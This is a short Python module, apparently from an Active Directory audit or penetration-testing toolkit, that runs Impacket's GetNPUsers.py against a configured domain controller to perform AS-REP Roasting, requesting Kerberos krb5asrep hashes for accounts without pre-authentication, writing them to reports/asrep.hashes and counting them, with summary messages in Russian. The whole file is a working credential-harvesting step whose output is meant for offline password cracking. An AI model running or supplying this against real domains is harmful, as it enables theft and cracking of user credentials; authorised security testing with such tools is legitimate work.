from config import CONFIG
from utils.runner import run_tool

def parse_asrep(out: str):
    hashes = out.count("::")
    return {
        "hashes_found": hashes,
        "summary": f"AS-REP Roasting: обнаружено хэшей krb5asrep — {hashes}. "
                   f"Файл сохранён в reports/asrep.hashes (при наличии уязвимых учёток)"
    }

def run_impacket_check():

    cmd = [
        "GetNPUsers.py",
        f"{CONFIG['domain']}/{CONFIG['username']}:{CONFIG['password']}",
        "-dc-ip", CONFIG['dc_ip'],
        "-request",
        "-outputfile", "reports/asrep.hashes"
    ]
    
    return run_tool(cmd, "AS-REP Roasting (GetNPUsers.py)", parse_asrep)
